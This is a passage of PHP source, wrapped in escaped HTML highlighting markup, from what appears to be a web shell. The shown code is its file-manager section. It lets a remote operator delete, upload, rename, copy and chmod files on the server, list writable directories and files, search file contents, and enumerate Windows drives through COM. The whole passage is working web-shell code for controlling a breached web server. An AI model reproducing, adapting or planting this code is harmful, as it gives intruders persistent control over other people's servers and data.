#2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (@unlink($filepath)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $succ++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fail++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Deleted folder/file have finished,choose '.count($dl).' success '<span style=\"text-decoration: underline;\">.$succ.' fail '.$fail);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Please select folder/file(s)');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#25805;&#20316;&#23436;&#27605;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'createdir'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('newdirname');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'fileperm'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('newperm');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('pfile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'copyfile'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('sname');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('tofile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'rename'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('oldname');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('newfilename');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'fileopform', 'target'=&gt;'_blank'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('opfile');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('name'=&gt;'getsize'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('getdir');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $free = @disk_free_space($nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$free &amp;&amp; $free = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $all = @disk_total_space($nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$all &amp;&amp; $all = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $used = $all-$free;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;File Manager - Current disk free '.sizecount($free).' of '.sizecount(<span style=\"text-decoration: underline;\">$all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cwd_links = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $path = explode('/', $nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $n=count($path);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i=0;$i&lt;$n-1;$i++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cwd_links .= '&lt;a href=\"javascript:godir(\\'';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($j=0;$j&lt;=$i;$j++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cwd_links .= $path[$j].'/';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cwd_links .= '\\');\"&gt;'.$path[$i].'/&lt;/a&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n?&gt;\n&lt;script type=\"text/javascript\"&gt;\ndocument.onclick = shownav;\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">shownav</span>(e){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> var</span> <span style=\"color: #ffcc66;\">src</span> = e?e.<span style=\"color: #ffcc66;\">target</span>:event.srcElement;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> do</span>{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(src.id ==\"jumpto\") {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('inputnav').style.display = \"\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('pathnav').style.display = \"none\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //hidenav();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> if</span>(src.id ==\"inputnav\") {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\"> return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   src = src.parentNode;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">}while</span>(src.parentNode)\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('inputnav').style.display = \"none\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $('pathnav').style.display = \"\";\n}\n&lt;/script&gt;\n&lt;div style=\"background:#eee;margin-bottom:10px;\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;table id=\"pathnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;tr&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td width=\"100%\"&gt;&lt;?php echo $cwd_links.' - '.getChmod($nowpath).' / <span style=\"text-decoration: underline;\">'.getPerms($nowpath).getUser($nowpath);?&gt; (&lt;?php echo $dir_writeable;?&gt;)&lt;/td&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td nowrap&gt;&lt;input class=\"bt\" id=\"jumpto\" name=\"jumpto\" value=\"Jump t<span style=\"text-decoration: underline;\">o\" type=\"button\"&gt;&lt;/td&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/tr&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/table&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;table id=\"inputnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\"<span style=\"text-decoration: underline;\"> style=\"display:none;\"&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;form action=\"\" method=\"post\" id=\"godir\" name=\"godir\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;tr&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td nowrap&gt;Current Directory (&lt;?php echo $dir_writeable;?&gt;, &lt;?php ec<span style=\"text-decoration: underline;\">ho getChmod($nowpath);?&gt;)&lt;/td&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td width=\"100%\"&gt;&lt;input name=\"view_writable\" value=\"0\" type=\"hidden\"<span style=\"text-decoration: underline;\"> /&gt;&lt;input class=\"input\" name=\"dir\" value=\"&lt;?php echo $nowpath;?&gt;\" type=\"text\" style=\"width:99%;margin:0 8px;\"&gt;&lt;/td&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;td nowrap&gt;&lt;input class=\"bt\" value=\"GO\" type=\"submit\"&gt;&lt;/td&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/tr&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/form&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/table&gt;\n&lt;?php\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (IS_WIN &amp;&amp; IS_COM) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $obj = new COM('scripting.filesystemobject');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($obj &amp;&amp; is_object($obj) &amp;&amp; $obj-&gt;Drives) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo '&lt;div class=\"drives\"&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $DriveTypeDB = array(0 =&gt; 'Unknow',1 =&gt; 'Removable',2 =&gt; 'Fixed',3 =<span style=\"text-decoration: underline;\">&gt; 'Network',4 =&gt; 'CDRom',5 =&gt; 'RAM Disk');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $comma = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($obj-&gt;Drives as $drive) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($drive-&gt;Path) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($comma.'&lt;a href=\"javascript:godir(\\''.$drive-&gt;Path.'/\\');\"<span style=\"text-decoration: underline;\">&gt;'.$DriveTypeDB[$drive-&gt;DriveType].'('.$drive-&gt;Path.')&lt;/a&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $comma = '&lt;span&gt;|&lt;/span&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo '&lt;/div&gt;';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n?&gt;\n&lt;/div&gt;\n&lt;?php\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $findstr = $_POST['findstr'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $re = $_POST['re'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tbhead();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"alt1\"&gt;&lt;td colspan=\"7\" style=\"padding:5px;line-height:20px;\"&gt;')<span style=\"text-decoration: underline;\">;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\"&gt;&lt;div<span style=\"text-decoration: underline;\"> style=\"float:right;\"&gt;&lt;input class=\"input\" name=\"uploadfile\" value=\"\" type=\"file\" /&gt; &lt;input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" /&gt;&lt;input name=\"uploaddir\" value=\"'.$nowpath.'\" type=\"hidden\" /&gt;&lt;input name=\"dir\" value=\"'.$nowpath.'\" type=\"hidden\" /&gt;&lt;/div&gt;&lt;/form&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;a href=\"javascript:godir(\\''.$_SERVER[\"DOCUMENT_ROOT\"].'\\');\"&gt;WebRoot&lt;/a<span style=\"text-decoration: underline;\">&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | &lt;a href=\"javascript:godir(\\'.\\');\"&gt;ScriptPath&lt;/a&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | &lt;a href=\"javascript:godir(\\''.$nowpath.'\\');\"&gt;View All&lt;/a&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | View Writable ( &lt;a href=\"javascript:godir(\\''.$nowpath.'\\',\\'dir\\');\"&gt;<span style=\"text-decoration: underline;\">Directory&lt;/a&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | &lt;a href=\"javascript:godir(\\''.$nowpath.'\\',\\'file\\');\"&gt;File&lt;/a&gt; )');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(' | &lt;a href=\"javascript:createdir();\"&gt;Create Directory&lt;/a&gt; | &lt;a href=\"java<span style=\"text-decoration: underline;\">script:createfile(\\''.$nowpath.'\\');\"&gt;Create File&lt;/a&gt;');</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;div style=\"padding:5px 0;\"&gt;&lt;form action=\"'.$self.'\" method=\"POST\"&gt;Find s<span style=\"text-decoration: underline;\">tring in files(current folder): &lt;input class=\"input\" name=\"findstr\" value=\"'.$findstr.'\" type=\"text\" /&gt; &lt;input class=\"bt\" value=\"Find\" type=\"submit\" /&gt; Type: &lt;input class=\"input\" name=\"writabledb\" value=\"'.$writabledb.'\" type=\"text\" /&gt;&lt;input name=\"dir\" value=\"'.$dir.'\" type=\"hidden\" /&gt; &lt;input name=\"re\" value=\"1\" type=\"checkbox\" '.($re ? 'checked' : '').' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;');</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width=\"16%\"&gt;Last mod<span style=\"text-decoration: underline;\">ified&lt;/td&gt;&lt;td width=\"10%\"&gt;Size&lt;/td&gt;&lt;td width=\"20%\"&gt;Chmod / Perms&lt;/td&gt;&lt;td width=\"22%\"&gt;Action&lt;/td&gt;&lt;/tr&gt;');</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata=array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata=array();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($view_writable == 'dir') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata = GetWDirList($nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($view_writable == 'file') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata = GetWFileList($nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($findstr) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata = GetSFileList($nowpath, $findstr, $re);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   // &#30446;&#24405;&#21015;&#34920;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //scandir()&#25928;&#29575;&#26356;&#39640;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirs=@opendir($dir);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($file=@readdir($dirs)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filepath=$nowpath.$file;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(@is_dir($filepath)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['filename']=$file;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['dirchmod']=getChmod($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['dirperm']=getPerms($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['fileowner']=getUser($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['dirlink']=$nowpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdb['server_link']=$filepath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[]=$dirdb;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {<span style=\"color: #f99157; background-color: #515151;\">        </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['filename']=$file;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['size']=sizecount(@filesize($filepath));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['filechmod']=getChmod($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['fileperm']=getPerms($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['fileowner']=getUser($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['dirlink']=$nowpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedb['server_link']=$filepath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[]=$filedb;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: 